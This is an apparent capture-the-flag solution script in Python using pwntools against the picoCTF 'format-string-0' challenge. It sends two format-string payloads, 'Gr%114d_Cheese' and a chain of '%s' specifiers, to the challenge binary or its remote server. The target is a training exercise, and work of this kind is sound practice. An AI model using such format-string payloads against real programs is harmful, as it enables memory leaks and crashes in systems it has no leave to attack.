#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./format-string-0", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc mimas.picoctf.net 49387"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}
io = start()

io.sendlineafter(b"recommendation: ", b"Gr%114d_Cheese")
io.sendlineafter(b"recommendation: ", b"Cla%sic_Che%s%steak\x00%s%s%s%s%s%s%s")

io.interactive()
